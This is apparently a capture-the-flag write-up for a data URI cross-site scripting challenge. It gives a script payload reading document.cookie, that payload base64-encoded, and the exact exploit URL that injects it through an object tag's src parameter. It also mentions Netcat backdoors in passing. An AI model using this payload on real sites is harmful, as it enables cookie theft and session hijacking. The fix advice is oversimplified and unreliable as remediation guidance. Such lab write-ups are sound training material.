# data URI XSS
/?page=media&src=nsa

## What is data URI
Data URI, defined by RFC 2397, is a smart way of embedding small files in line in HTML documents. Instead of linking to a file stored locally on the server, the file is provided within the URL itself as a base64-encoded string of data preceded by a mime-type.

## How to get flag
By inspecting image, we can find image is rendered by object tag. It shows data depends on which src params. 

Encode script code with base64.
```
base64 encoding
<script>alert(document.cookie)</script>
PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+
```

And Make url like below.
```
/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ
```

The 'data' attribute of the object tag defines a URL that refers to the object's data.

## Vulnerability
This technique allows the dynamic creation of files of different MIME types. An attacker can create any files that may contain malicious payload for exploiting various overflow vulnerabilities. An attacker may also create a backdoor, which will either initiate a new connection or listens for a new connection. Generating Netcat might be an option.

## How to Fix
Don't use object and embed tag. It is vulnarable from XSS.

## Resouces
(Bypass XSS filters using data URIs)[https://www.paladion.net/blogs/bypass-xss-filters-using-data-uris]
(base64 encode-decode)[https://www.motobit.com/util/base64-decoder-encoder.asp]